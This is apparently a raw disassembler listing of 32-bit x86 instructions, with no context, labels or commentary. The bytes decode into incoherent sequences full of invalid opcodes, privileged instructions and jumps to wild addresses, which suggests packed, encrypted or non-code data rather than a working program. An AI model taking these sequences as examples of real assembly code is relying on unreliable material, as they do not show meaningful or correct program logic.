  430ad8:	mov    edx,ebx
  430ada:	lock (bad) 
  430adc:	ror    esi,cl
  430ade:	push   ebp
  430adf:	scas   eax,DWORD PTR es:[edi]
  430ae0:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430ae6:	fwait
  430ae7:	sub    esi,DWORD PTR [edx]
  430ae9:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430af0:	xor    esp,DWORD PTR [ebx]
  430af2:	add    ecx,DWORD PTR [ebp-0x18]
  430af5:	mov    edi,DWORD PTR [ebp-0x8]
  430af8:	mov    bl,cl
  430afa:	cmp    dl,bl
  430afc:	jb     0x430acc
  430afe:	add    dh,dl
  430b00:	dec    ebp
  430b01:	scas   eax,DWORD PTR es:[edi]
  430b02:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430b08:	shr    DWORD PTR [ebx],cl
  430b0a:	into   
  430b0b:	cmp    edx,esi
  430b0d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430b13:	dec    ebp
  430b14:	dec    ebp
  430b15:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430b1b:	retf   
  430b1c:	xor    edx,esi
  430b1e:	add    ecx,esi
  430b20:	imul   ecx,edx
  430b23:	mov    DWORD PTR [ebp+0x8],edx
  430b26:	xor    ecx,DWORD PTR [ebp+0x2b]
  430b29:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430b2f:	add    esi,DWORD PTR [ebx]
  430b31:	rol    BYTE PTR [ebx],0x45
  430b34:	rdtsc  
  430b36:	xlat   BYTE PTR ds:[ebx]
  430b37:	pushf  
  430b38:	jge    0x430ac3
  430b3a:	xor    ebx,eax
  430b3c:	sub    eax,DWORD PTR [ebp-0x73]
  430b3f:	(bad)  
  430b40:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430b47:	dec    ebp
  430b48:	xchg   BYTE PTR [ebx],dh
  430b4a:	inc    DWORD PTR [ebx]
  430b4c:	(bad)  
  430b4d:	jmp    0x430b9c
  430b4f:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430b55:	dec    ebp
  430b56:	into   
  430b57:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430b5d:	fwait
  430b5e:	shl    DWORD PTR [edx],cl
  430b60:	retf   0x5588
  430b63:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430b69:	add    eax,DWORD PTR [eax]
  430b6b:	call   0x8ace60bd
  430b70:	fcom   QWORD PTR [ecx]
  430b72:	retf   
  430b73:	jb     0x430bda
  430b75:	add    ch,cl
  430b77:	dec    ebp
  430b78:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430b7e:	dec    ebp
  430b7f:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430b85:	jge    0x430b55
  430b87:	mov    BYTE PTR [edi+0xf723b3a],ch
  430b8d:	add    cl,dh
  430b8f:	dec    ebp
  430b90:	dec    DWORD PTR [ebx-0x2c031b01]
  430b96:	inc    ebp
  430b97:	push   ebp
  430b98:	dec    DWORD PTR [ebx-0x73ff2734]
  430b9e:	lea    ebx,[ebx-0x7400cdac]
  430ba4:	push   eax
  430ba5:	mov    ah,0x45
  430ba7:	push   ebp
  430ba8:	mov    esi,DWORD PTR [ebx]
  430baa:	les    esi,FWORD PTR [ebx]
  430bac:	add    BYTE PTR [ebx],al
  430bae:	inc    DWORD PTR [ebx]
  430bb0:	mov    ecx,DWORD PTR [edi]
  430bb2:	cld    
  430bb3:	retf   0x4d80
  430bb6:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430bbc:	jne    0x430b49
  430bbe:	jmp    eax
  430bc0:	ror    bl,1
  430bc2:	or     cl,dh
  430bc4:	add    BYTE PTR [edi-0xf2f7475],ch
  430bca:	not    bl
  430bcc:	adc    al,0xca
  430bce:	inc    ebp
  430bcf:	push   ebp
  430bd0:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430bd6:	push   0xaf80d6
  430bdb:	mov    eax,DWORD PTR [eax]
  430bdd:	in     al,0xff
  430bdf:	sti    
  430be0:	sbb    dh,cl
  430be2:	pop    esi
  430be3:	xchg   esp,eax
  430be4:	leave  
  430be5:	fwait
  430be6:	add    al,0x32
  430be8:	push   ebp
  430be9:	cmp    ebp,esp
  430beb:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430bef:	dec    DWORD PTR [ecx-0x740f0375]
  430bf5:	push   ebp
  430bf6:	cld    
  430bf7:	xor    ebp,ebx
  430bf9:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430bff:	push   ebp
  430c00:	clc    
  430c01:	xor    esi,ecx
  430c03:	add    esi,DWORD PTR [ebp-0x75]
  430c06:	(bad)  
  430c07:	hlt    
  430c08:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430c0f:	mov    DWORD PTR [esi],eax
  430c11:	hlt    
  430c12:	(bad)  
  430c13:	dec    ebp
  430c14:	add    esi,DWORD PTR [ebx]
  430c16:	(bad)  
  430c17:	mov    edx,0xffc68d0a
  430c1c:	add    dl,cl
  430c1e:	leave  
  430c1f:	push   ebp
  430c20:	push   ebp
  430c21:	mov    ebp,esp
  430c23:	fcom   QWORD PTR [ecx+0x7d]
  430c26:	inc    ebp
  430c27:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430c2d:	iret   
  430c2e:	cld    
  430c2f:	retf   0x868f
  430c32:	loopne 0x430c31
  430c34:	mov    edi,edi
  430c36:	mov    esi,DWORD PTR [ebp-0x8]
  430c39:	mov    esi,eax
  430c3b:	cld    
  430c3c:	jne    0x430bee
  430c3e:	mov    BYTE PTR [ecx],0xa
  430c41:	add    dh,al
  430c43:	test   DWORD PTR [eax],ecx
  430c45:	inc    esi
  430c47:	inc    DWORD PTR [edi]
  430c49:	mov    eax,esi
  430c4b:	cld    
  430c4c:	add    DWORD PTR [eax+0x901c6],eax
  430c52:	leave  
  430c53:	xor    BYTE PTR [ebp+0x45],dl
  430c56:	in     al,dx
  430c57:	mov    edx,DWORD PTR [ecx-0x40]
  430c5a:	inc    ebp
  430c5b:	add    BYTE PTR [ecx-0x74000301],cl
  430c61:	int3   
  430c62:	cld    
  430c63:	jne    0x430c1d
  430c65:	call   0xcc1f70
  430c6a:	mov    esi,DWORD PTR [ebp-0x8]
  430c6d:	test   eax,esi
  430c6f:	je     0x430ce6
  430c71:	mov    eax,esi
  430c73:	cld    
  430c74:	add    al,0x80
  430c76:	add    WORD PTR [ecx+0x0],ax
  430c7a:	fiadd  DWORD PTR [eax]
  430c7c:	mov    BYTE PTR [eax],0x3d
  430c7f:	push   0xffffffc3
  430c81:	push   esi
  430c82:	mov    edx,DWORD PTR [eax+0x51]
  430c85:	pop    edi
  430c86:	lea    ebx,[ebx-0x8]
  430c89:	ret    0x45
  430c8c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c92:	xchg   eax,edi
  430c94:	mov    DWORD PTR [ebp-0x75],ecx
  430c97:	push   esi
  430c98:	clc    
  430c99:	jne    0x430c6b
  430c9b:	mov    ecx,0xf8450b0b
  430ca0:	(bad)  
  430ca1:	push   cs
  430ca2:	or     BYTE PTR [ebp-0x3a],dh
  430ca5:	cmp    eax,DWORD PTR [ecx]
  430ca7:	pop    esi
  430ca8:	(bad)  
  430ca9:	or     al,0x5
  430cab:	inc    eax
  430cac:	leave  
  430cad:	jmp    0x40cf:0x25564204
  430cb4:	leave  
  430cb5:	in     eax,dx
  430cb6:	inc    DWORD PTR [eax-0x75]
  430cb9:	fimul  DWORD PTR [ebx-0x228139be]
  430cbf:	inc    eax
  430cc0:	nop
  430cc1:	loopne 0x430cc2
  430cc3:	ret    
  430cc4:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430cca:	add    eax,0xff45e8f8
  430ccf:	push   esi
  430cd0:	push   DWORD PTR [ebp-0x39]
  430cd3:	mov    eax,0x7edda46
  430cd8:	or     al,0x6
  430cda:	push   DWORD PTR [ebp-0x3a]
  430cdd:	cmp    eax,DWORD PTR [edx]
  430cdf:	pop    esi
  430ce0:	ret    
  430ce1:	or     al,0x56
  430ce3:	inc    ecx
  430ce4:	push   ebp
  430ce5:	jle    0x430cd3
  430ce7:	inc    edx
  430ce8:	inc    ebp
  430ce9:	int    0x1
  430ceb:	inc    ecx
  430cec:	sub    BYTE PTR ds:0xe77541fc,ah
  430cf2:	add    DWORD PTR [edx+0x1c],eax
  430cf5:	retf   0xc38b
  430cf8:	adc    al,0x8b
  430cfa:	xchg   edx,eax
  430cfb:	push   ecx
  430cfc:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d02:	rcl    DWORD PTR [esi-0x9],cl
  430d05:	jne    0x430d57
  430d07:	mov    eax,0x7c80ece
  430d0c:	rol    DWORD PTR [esi],cl
  430d0e:	div    DWORD PTR [ebp+0x50]
  430d11:	cmp    ecx,edx
  430d13:	pop    esi
  430d14:	dec    BYTE PTR [edx]
  430d16:	in     al,dx
  430d17:	inc    edx
  430d18:	sub    esp,ecx
  430d1a:	inc    eax
  430d1b:	(bad)  
  430d1c:	push   eax
  430d1d:	add    edx,DWORD PTR [eax-0x1f]
  430d20:	push   edi
  430d21:	add    dh,dh
  430d23:	leave  
  430d24:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430d28:	add    BYTE PTR [ecx+0x0],dl
  430d2b:	inc    ebp
  430d2c:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430d32:	add    BYTE PTR [eax-0x7fbf448],bh
  430d38:	add    al,0x2
  430d3a:	jmp    0x57eb894
  430d3f:	jne    0x430d29
  430d41:	mov    eax,DWORD PTR [edx]
  430d43:	or     BYTE PTR [eax],al
  430d45:	inc    ecx
  430d46:	stc    
  430d47:	in     eax,dx
  430d48:	ss inc eax
  430d4a:	aas    
  430d4b:	out    0x7d,eax
  430d4d:	inc    ecx
  430d4e:	mov    ebp,ecx
  430d50:	lock ret 0x7d
  430d54:	and    ecx,DWORD PTR [ebx-0x171777]
  430d5a:	add    bh,bh
  430d5c:	aad    0xd7
  430d5e:	add    dh,cl
  430d60:	clts   
  430d62:	(bad)  
  430d63:	call   0xffce0c68
  430d68:	hlt    
  430d69:	iret   
  430d6a:	jge    0x430d42
  430d6c:	rol    DWORD PTR [esi-0x80],cl
  430d6f:	jmp    0x1c5c7c
  430d74:	out    dx,al
  430d75:	mov    eax,DWORD PTR [ebx]
  430d77:	(bad)  
  430d78:	pop    esi
  430d79:	push   es
  430d7a:	cmp    al,0xe8
  430d7c:	sar    edi,0x8
  430d7f:	inc    DWORD PTR [edi]
  430d81:	inc    esi
  430d82:	(bad)  
  430d83:	loopne 0x430e03
  430d85:	push   edi
  430d86:	push   cs
  430d87:	push   ebx
  430d88:	add    BYTE PTR [ebx+0x24008b56],cl
  430d8e:	add    BYTE PTR [ebp+0x50],al
  430d91:	push   eax
  430d92:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d98:	sub    edx,DWORD PTR [esi-0x24]
  430d9b:	jne    0x430d53
  430d9d:	lods   eax,DWORD PTR ds:[esi]
  430d9e:	mov    edx,DWORD PTR [edx-0x34]
  430da1:	dec    esi
  430da2:	out    0x83,eax
  430da4:	into   
  430da5:	push   edi
  430da7:	loopne 0x430d77
  430da9:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430dad:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430db4:	rol    DWORD PTR [edx],0x8
  430db7:	mov    esp,ecx
  430db9:	cmp    DWORD PTR [ebx],0xc
  430dbc:	mov    esi,0x5001c0
  430dc1:	push   eax
  430dc2:	push   cs
  430dc3:	push   eax
  430dc4:	(bad)  
  430dc5:	sub    edx,edi
  430dc7:	push   esi
  430dc8:	adc    al,0xcb
  430dca:	ins    DWORD PTR es:[edi],dx
  430dcb:	mov    eax,0x203e8
  430dd0:	add    al,ah
  430dd2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430dd9:	add    dh,al
  430ddb:	add    ah,ch
  430ddd:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430de3:	pop    ecx
  430de4:	or     eax,ebx
  430de6:	cli    
  430de7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430ded:	lea    ebp,[ebx]
  430def:	mov    edx,DWORD PTR [edx-0x4]
  430df2:	dec    ecx
  430df3:	inc    ebp
  430df4:	shr    BYTE PTR [ebx],0x4b
  430df7:	and    al,0x0
  430df9:	(bad)  
  430dfa:	jne    0x430e41
  430dfc:	pop    eax
  430dfd:	mov    al,0x5a
  430dff:	call   0x142105e
  430e04:	and    al,0x85
  430e06:	push   edx
  430e07:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e0b:	dec    ebp
  430e0c:	mov    cl,0x23
  430e0e:	jmp    0x430dfc
  430e10:	mov    al,0xe7
  430e12:	call   0x1391100
  430e17:	shr    DWORD PTR [eax+ebx*2],cl
  430e1a:	lock (bad) 
  430e1c:	adc    eax,0x757f008d
  430e21:	out    0x58,eax
  430e23:	cmp    al,0x7
  430e25:	pop    edx
  430e26:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430e2d:	push   ecx
  430e2e:	cld    
  430e2f:	mov    esi,0x3b0175
  430e34:	and    al,0xb0
  430e36:	xor    BYTE PTR [edx+0x1],0x8b
  430e3a:	add    ah,bh
  430e3c:	mov    edi,DWORD PTR [ebp-0x4]
  430e3f:	psubsw mm7,QWORD PTR [edi]
  430e42:	add    DWORD PTR [ebp+0x0],ebp
  430e45:	rcr    eax,1
  430e47:	mov    edi,ecx
  430e49:	and    eax,DWORD PTR [eax]
  430e4b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430e51:	call   0x130113a
  430e56:	add    al,cl
  430e58:	mov    ebp,esi
  430e5a:	aam    0x83
  430e5c:	or     DWORD PTR [ecx],eax
  430e5e:	jne    0x430e51
  430e60:	mov    eax,DWORD PTR [eax]
  430e62:	aam    0x0
  430e64:	dec    ebp
  430e65:	jne    0x430df2
  430e67:	cmp    ebx,eax
  430e69:	jb     0x430eb8
  430e6b:	jmp    0x430df8
  430e6d:	mov    ebx,esp
  430e6f:	int3   
  430e70:	dec    ebp
  430e71:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430e78:	mov    edx,0x8b0a8b
  430e7d:	cmp    ecx,DWORD PTR [eax]
  430e7f:	jb     0x430e58
  430e81:	pop    edx
  430e82:	push   edi
  430e83:	cli    
  430e84:	pop    es
  430e85:	mov    eax,ecx
  430e87:	jb     0x430e8b
  430e89:	add    DWORD PTR [ebx],0xa
  430e8c:	mov    eax,DWORD PTR [ebx]
  430e8e:	int3   
  430e8f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e95:	jmp    0x430e22
  430e97:	mov    al,0xe8
  430e99:	call   0x104111b
  430e9e:	add    edx,DWORD PTR [ecx+ecx*8]
  430ea1:	pop    edi
  430ea2:	or     BYTE PTR [ecx-0x73],bl
  430ea5:	pop    ecx
  430ea6:	inc    edi
  430ea7:	xor    al,0xeb
  430ea9:	push   ecx
  430eaa:	mov    edi,DWORD PTR [edx+0xc506cc]
  430eb0:	call   0xb20fb5
  430eb5:	int3   
  430eb6:	sbb    BYTE PTR [esi],ch
  430eb8:	inc    ebp
  430eb9:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430ebf:	call   0x9c112e
  430ec4:	or     BYTE PTR [ebx-0x73],dl
  430ec7:	cmp    al,0x47
  430ec9:	mov    al,0x1
  430ecb:	jb     0x430ecd
  430ecd:	mov    al,0x10
  430ecf:	push   eax
  430ed0:	add    al,0x75
  430ed2:	add    BYTE PTR [ebx],ch
  430ed4:	add    ebx,esp
  430ed6:	int3   
  430ed7:	jne    0x430ee9
  430ed9:	movsx  edx,cl
  430edc:	add    DWORD PTR [eax],eax
  430ede:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430ee5:	mov    gs,edi
  430ee7:	add    BYTE PTR [eax-0x50],ch
  430eea:	add    al,ch
  430eec:	mov    eax,DWORD PTR [ecx]
  430eee:	sub    eax,DWORD PTR [eax]
  430ef0:	jb     0x430f67
  430ef2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430ef6:	jge    0x430ee0
  430ef8:	add    al,0x1
  430efa:	add    DWORD PTR [eax],0x0
  430efd:	jne    0x430eff
  430eff:	je     0x430f46
  430f01:	mov    eax,DWORD PTR [edi]
  430f03:	ror    BYTE PTR [ebp+0x4d],1
  430f06:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430f0d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430f13:	mov    DWORD PTR [ebx],ebp
  430f15:	fadd   DWORD PTR [eax+0x75]
  430f18:	inc    eax
  430f19:	pop    eax
  430f1a:	lea    ebx,[ecx+0x4f]
  430f1d:	push   0xb1000003
  430f22:	out    dx,eax
  430f23:	add    ebp,DWORD PTR [edx+edx*2]
  430f26:	add    BYTE PTR [ebx+ecx*4],bh
  430f29:	mov    ch,BYTE PTR [ebx]
  430f2b:	jb     0x430f9f
  430f2d:	add    al,0x89
  430f2f:	push   eax
  430f30:	call   0x842b5ca2
  430f35:	add    DWORD PTR [eax+eax*1],eax
  430f38:	jae    0x430f4e
  430f3a:	icebp  
  430f3b:	inc    ebp
  430f3c:	mov    eax,DWORD PTR gs:[ecx]
  430f3f:	int3   
  430f40:	out    dx,al
  430f41:	loopne 0x430f90
  430f43:	sub    eax,DWORD PTR [edx]
  430f45:	push   0xffffff83
  430f47:	pop    esi
  430f48:	push   cs
  430f49:	jl     0x430f64
  430f4b:	add    al,0xaf
  430f4d:	xor    eax,0x832b6d00
  430f52:	mov    eax,DWORD PTR [edx]
  430f54:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430f5a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430f60:	inc    ebp
  430f61:	shr    ebx,0x3
  430f64:	or     DWORD PTR [eax],0x4
  430f67:	push   0xffffffa5
  430f69:	pop    esi
  430f6a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430f71:	jmp    0x430fd0
  430f73:	mov    edi,0xff0272
  430f78:	fdivr  QWORD PTR [ebp+0x5d]
  430f7b:	push   0x4e
  430f7d:	pop    ecx
  430f7e:	call   0x435383
  430f83:	mov    DWORD PTR [ebx],eax
  430f85:	in     al,0xc8
  430f87:	rol    BYTE PTR [ebp-0x75],0xc1
  430f8b:	call   0xad116c
  430f90:	pop    esi
  430f91:	enter  0xceff,0x8b
  430f95:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f99:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430fa0:	je     0x430fa2
  430fa2:	or     DWORD PTR [ebx-0x74183b24],eax
  430fa8:	jne    0x430f8e
  430faa:	jmp    0x430fa5
  430fac:	push   DWORD PTR [edx-0x24]
  430faf:	push   0x4d
  430fb1:	pop    ecx
  430fb2:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430fb6:	jge    0x430fbe
  430fb8:	mov    eax,eax
  430fba:	sub    ebp,DWORD PTR [edx+0x24]
  430fbd:	pop    esi
  430fbe:	inc    ebp
  430fbf:	mov    esp,0x8b6077
  430fc4:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430fca:	lods   al,BYTE PTR ds:[esi]
  430fcb:	add    BYTE PTR [ebx],bh
  430fcd:	enter  0xce73,0x49
  430fd1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430fd9:	stc    
  430fda:	jge    0x43104e
  430fdc:	jnp    0xdd42934b
  430fe2:	call   0xc610b8
  430fe7:	fadd   st(0),st
  430fe9:	dec    esi
  430fea:	ins    BYTE PTR es:[edi],dx
  430feb:	stc    
  430fec:	cmp    al,0x73
  430fee:	push   ebp
  430fef:	mov    eax,0xf8028b
  430ff4:	jne    0x430fb7
  430ff6:	mov    esi,ecx
  430ff8:	mov    esp,DWORD PTR [ebp+0x2c]
  430ffb:	add    edi,DWORD PTR [ebp-0x24]
  430ffe:	sub    esp,eax
  431000:	and    al,0x45
  431002:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431008:	sbb    al,0xee
  43100a:	pop    esi
  43100b:	call   0x83103b
  431010:	fsubr  st,st(3)
  431012:	sti    
  431013:	add    BYTE PTR gs:[ecx],bh
  431016:	add    eax,esp
  431018:	add    DWORD PTR [esi],eax
  43101a:	rol    DWORD PTR [ebp+0x8],0x29
  43101e:	mov    esp,eax
  431020:	clc    
  431021:	jne    0x431098
  431023:	mov    eax,0x8b0673
  431028:	loopne 0x43106f
  43102a:	loopne 0x430fb5
  43102c:	lods   al,BYTE PTR ds:[esi]
  43102d:	int3   
  43102e:	inc    ebp
  43102f:	mov    DWORD PTR gs:[eax+edi*8],eax
  431033:	add    al,0xc3
  431035:	sub    ecx,DWORD PTR [ebp+0x47]
  431038:	(bad)  
  43103a:	shr    BYTE PTR [ebp-0x1f],0xe8
  43103e:	add    eax,DWORD PTR [eax]
  431040:	call   0x644d145
  431045:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43104b:	dec    esi
  43104c:	ins    DWORD PTR es:[edi],dx
  43104d:	in     al,dx
  43104e:	lea    eax,[eax]
  431050:	inc    ebp
  431051:	inc    ebp
  431052:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431058:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431062:	and    al,0xdc
  431064:	ror    DWORD PTR [edx+0x24],0xf7
  431068:	or     BYTE PTR [ebp+0x4c],dh
  43106b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43106f:	stos   BYTE PTR es:[edi],al
  431070:	adc    edx,edi
  431072:	inc    esp
  431073:	add    edi,DWORD PTR [eax]
  431075:	jne    0x43105a
  431077:	mov    DWORD PTR [eax-0x7449db04],ecx
  43107d:	cmp    ecx,DWORD PTR [edi]
  43107f:	sub    BYTE PTR [ebp-0x7e],dl
  431082:	sar    ebp,0xb
  431085:	jmp    FWORD PTR [edi+0x2400392a]
  43108b:	sub    esi,DWORD PTR [ebx-0x73]
  43108e:	mov    esp,DWORD PTR [ecx+edi*4]
  431091:	mov    ecx,DWORD PTR [eax]
  431093:	and    BYTE PTR [eax],al
  431095:	jne    0x431061
  431097:	sub    ebp,ecx
  431099:	sbb    BYTE PTR [esi+0x32],ah
  43109c:	dec    ebp
  43109d:	push   ebp
  43109e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4310a4:	ret    
  4310a5:	mov    edx,ebp
  4310a7:	leave  
  4310a8:	sub    DWORD PTR [esi+0x24],ebx
  4310ab:	ret    0x2b
  4310ae:	pop    ax
  4310b0:	push   ebp
  4310b1:	rol    BYTE PTR [ebx],0xeb
  4310b4:	add    DWORD PTR [ecx+0x6c0001],0x40
  4310bb:	jb     0x431112
  4310bd:	ret    
  4310be:	in     al,dx
  4310bf:	jecxz  0x43104c
  4310c1:	push   esi
  4310c2:	xchg   esp,eax
  4310c3:	jne    0x4310c5
  4310c5:	cmp    edx,DWORD PTR [esi+0x1c]
  4310c8:	jne    0x4310ae
  4310ca:	mov    eax,DWORD PTR [ebp-0x77]
  4310cd:	ror    DWORD PTR [ebx+0x899408],0xe0
  4310d4:	mov    esi,DWORD PTR [ebp-0x75]
  4310d7:	pop    esi
  4310d8:	nop
  4310d9:	mov    eax,DWORD PTR [eax]
  4310db:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4310e1:	add    al,0x0
  4310e3:	inc    ebp
  4310e4:	mov    eax,DWORD PTR [ebx]
  4310e6:	mov    ebp,ebx
  4310e8:	cmp    al,0xf
  4310ea:	or     al,al
  4310ec:	inc    ebp
  4310ed:	inc    ebp
  4310ee:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  4310f4:	cld    
  4310f5:	add    BYTE PTR [edi+0x546c16c0],dh
  4310fb:	add    BYTE PTR [ecx-0x5],dl
  4310fe:	add    eax,0x17200
  431103:	sbb    al,0x85
  431105:	dec    esp
  431106:	je     0x431140
  431108:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43110c:	add    BYTE PTR [ebx],bh
  43110e:	(bad)  
  43110f:	and    al,0x32
  431111:	jae    0x4310af
  431113:	mov    cl,cl
  431115:	inc    DWORD PTR [esp]
  431118:	push   ebp
  431119:	shr    esp,0x8
  43111c:	in     al,dx
  43111d:	push   esp
  43111e:	add    DWORD PTR [eax],esp
  431120:	add    bl,cl
  431122:	inc    ebp
  431123:	mov    bh,0x89
  431125:	add    ah,bh
  431127:	jmp    0xca752071
  43112c:	pushf  
  43112d:	dec    esp
  43112e:	mov    edx,0xf8178520
  431133:	fst    DWORD PTR [ebp+0x0]
  431136:	mov    BYTE PTR [eax],0xc4
  431139:	sub    edx,DWORD PTR [ebx-0x3f]
  43113c:	inc    ebp
  43113d:	add    eax,0xc601da
  431142:	mov    al,0xc6
  431145:	ins    BYTE PTR es:[edi],dx
  431146:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  43114d:	dec    esp
  43114e:	jmp    DWORD PTR [eax]
  431150:	inc    ebp
  431151:	fnstcw WORD PTR [esi+0x29]
  431154:	test   BYTE PTR [eax],0xc8
  431157:	rol    BYTE PTR [eax],0xc0
  43115a:	lea    ecx,[ebp-0x3cf0dbcb]
  431160:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  431166:	inc    esi
  431167:	add    DWORD PTR [eax],ebx
  431169:	add    dh,bh
  43116b:	mov    esi,DWORD PTR [edx+0x8]
  43116e:	(bad)  
  43116f:	fdiv   QWORD PTR ss:[ecx]
  431172:	(bad)  
  431173:	mov    bl,ch
  431175:	add    esi,eax
  431177:	add    dh,bl
  431179:	or     esi,eax
  43117b:	mov    dl,0xdf
  43117d:	add    esi,eax
  43117f:	add    al,ah
  431181:	push   cs
  431182:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431189:	or     BYTE PTR [ebx],dh
  43118b:	dec    ecx
  43118c:	lea    eax,[ebx]
  43118e:	xor    eax,0x18fc0fc7
  431193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431194:	repz clc 
  431196:	add    eax,DWORD PTR [ebp+0x46]
  431199:	prefetcht0 BYTE PTR [ecx-0x2]
  43119d:	xor    eax,0x7c60872
  4311a2:	mov    esp,0xbd32c69b
  4311a7:	pop    esi
  4311a8:	mov    cl,0xbe
  4311ab:	or     al,0xc6
  4311ad:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4311b4:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4311bb:	add    dh,al
  4311bd:	mov    eax,ebx
  4311bf:	xor    DWORD PTR [ebx],0x35008dbc
  4311c5:	mov    ecx,DWORD PTR [edi]
  4311c7:	sbb    al,0x18
  4311c9:	inc    ebp
  4311ca:	xrelease mov DWORD PTR [ebx],0x188546f4
  4311d1:	clc    
  4311d2:	(bad)  
  4311d3:	xor    DWORD PTR [edx-0x64],esi
  4311d6:	lea    ecx,[ecx+0x45ffe838]
  4311dc:	mov    ecx,ebx
  4311de:	fadd   st,st(6)
  4311e0:	dec    ebp
  4311e1:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4311e7:	out    0x1,eax
  4311e9:	inc    ebp
  4311ea:	lea    ebp,ds:0xc8ffc6ff
  4311f0:	enter  0xa33,0xc6
  4311f4:	push   ebp
  4311f5:	leave  
  4311f6:	(bad)  
  4311f7:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4311fd:	add    BYTE PTR [ebp+0x44],al
  431200:	mov    eax,esp
  431202:	mov    WORD PTR [esi+0x46398300],?
  431208:	psubusw mm4,QWORD PTR [esi-0x78]
  43120c:	add    BYTE PTR [ebx-0x1303f975],al
  431212:	add    BYTE PTR [ebp+0x1],0xeb
  431216:	add    BYTE PTR [ebp+0x38],al
  431219:	in     eax,dx
  43121a:	inc    ebp
  43121b:	inc    ebp
  43121c:	mov    ebx,ebx
  43121e:	add    BYTE PTR [ebp+0x0],0xec
  431222:	mov    DWORD PTR [ebp-0x41],eax
  431225:	sub    eax,0x2c00454e
  43122a:	ins    DWORD PTR es:[edi],dx
  43122b:	inc    ebp
  43122c:	add    BYTE PTR [esi+0x66],bh
  43122f:	test   BYTE PTR [ebp-0x2300bc],0xb6
  431236:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  431240:	dec    edi
  431241:	pop    es
  431242:	add    ah,ch
  431244:	mov    DWORD PTR [ebp+0x68],eax
  431247:	in     eax,dx
  431248:	inc    DWORD PTR [ebp-0x7d]
  43124b:	out    0xc0,al
  43124d:	inc    ebp
  43124e:	mov    edx,esp
  431250:	push   0x45
  431252:	(bad)  
  431253:	jmp    0xdf925810
  431258:	add    BYTE PTR [ebp-0x77],al
  43125b:	out    dx,al
  43125c:	ins    BYTE PTR es:[edi],dx
  43125d:	inc    ebp
  43125e:	jmp    edi
  431260:	add    DWORD PTR [ebp-0x14],0x7e
  431264:	mov    esi,esi
  431266:	outs   dx,BYTE PTR ds:[esi]
  431267:	inc    esp
  431268:	(bad)  
  431269:	mov    esp,0x8341b68d
  43126e:	mov    DWORD PTR [esi+0x70],eax
  431271:	fcos   
  431273:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  431279:	in     al,dx
  43127a:	jb     0x431201
  43127c:	(bad)  
  43127d:	dec    DWORD PTR [ebx-0x7aba9901]
  431283:	mov    edi,edi
  431285:	fdivr  st,st(7)
  431287:	out    dx,eax
  431288:	rcl    BYTE PTR [ebx],0x66
  43128b:	mov    DWORD PTR [ebp-0xc70075],eax
  431291:	(bad)  
  431292:	std    
  431293:	cmp    eax,DWORD PTR [eax]
  431295:	jne    0x4312fd
  431297:	mov    DWORD PTR [ebp-0xba0048],eax
  43129d:	in     al,dx
